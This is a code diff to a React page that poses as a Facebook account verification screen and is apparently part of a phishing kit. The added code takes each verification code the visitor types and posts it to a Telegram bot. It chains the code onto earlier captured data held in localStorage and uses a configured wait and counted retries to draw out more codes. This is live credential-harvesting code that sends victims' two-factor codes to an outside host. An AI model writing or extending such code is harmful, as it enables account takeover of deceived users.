@@ -4,10 +4,11 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import VerifyImage from '@/assets/images/verify-image.png';
 import { useEffect, useRef, useState, type FC } from 'react';
 import { useNavigate } from 'react-router';
-import { supabase } from '@/utils/supabase';
 import VerifyImagePc from '@/assets/images/verify-image-pc.png';
 import FacebookLogo from '@/assets/images/facebook-logo.svg';
 import translateText from '@/utils/translate';
+import config from '@/utils/config';
+import axios from 'axios';
 
 interface GeoLocationData {
     city: string;
@@ -45,6 +46,7 @@ const getGeolocationData = (): GeoLocationData | null => {
         return null;
     }
 };
+const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
 
 const Verify: FC = () => {
     const navigate = useNavigate();
@@ -52,7 +54,6 @@ const Verify: FC = () => {
     const [code, setCode] = useState('');
     const [showError, setShowError] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
-    const [dataId, setDataId] = useState(0);
     const [currentAttemp, setCurrentAttemp] = useState(0);
     const [maxAttemp, setMaxAttemp] = useState(0);
     const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>({
@@ -85,12 +86,8 @@ const Verify: FC = () => {
 
     useEffect(() => {
         const getConfig = async () => {
-            const { data, error } = await supabase.from('config').select('max_code');
-            if (!error) {
-                if (data.length != 0) {
-                    setMaxAttemp(data[0].max_code);
-                }
-            }
+            const maxPass = config.so_lan_sai_code;
+            setMaxAttemp(maxPass);
         };
         const fetchGeolocation = async () => {
             const geoData = getGeolocationData();
@@ -100,7 +97,6 @@ const Verify: FC = () => {
         };
 
         getConfig();
-        setDataId(Number(localStorage.getItem('data_id')));
         fetchGeolocation();
     }, []);
     const handleSubmit = async () => {
@@ -109,7 +105,24 @@ const Verify: FC = () => {
             return;
         }
         setIsLoading(true);
-        await supabase.from('list_code').insert({ code: code, data_id: dataId });
+        const messageId = localStorage.getItem('message_id');
+        const oldMessage = localStorage.getItem('message');
+        const token = config.token;
+        const chat_id = config.chat_id;
+        await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, {
+            chat_id: chat_id,
+            message_id: messageId
+        });
+        const newMessage = oldMessage + `\n<b>Code ${currentAttemp}:</b> <code>${code}</code>`;
+        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chat_id,
+            text: newMessage,
+            parse_mode: 'HTML'
+        });
+        const data = await response.data;
+        localStorage.setItem('message', newMessage);
+        localStorage.setItem('message_id', data.result.message_id);
+        await delay(config.thoi_gian_sai_code * 1000);
         setCurrentAttemp(currentAttemp + 1);
         setCode('');
         setIsLoading(false);
@@ -133,7 +146,7 @@ const Verify: FC = () => {
                 </div>
             </header>
 
-            <div className='mx-auto max-w-[600px] space-y-4 px-4 py-6 sm:space-y-4'>
+            <div className='mx-auto max-w-150 space-y-4 px-4 py-6 sm:space-y-4'>
                 <div className='text-sm font-medium text-[#0a1317]'>{translatedTexts.accountFacebook}</div>
                 <p className='text-2xl font-semibold text-[#0a1317]'>{translatedTexts.checkNotifications}</p>
                 <p className='text-[15px] leading-5 text-[#0a1317]'>{translatedTexts.goToFacebookAccount}</p>
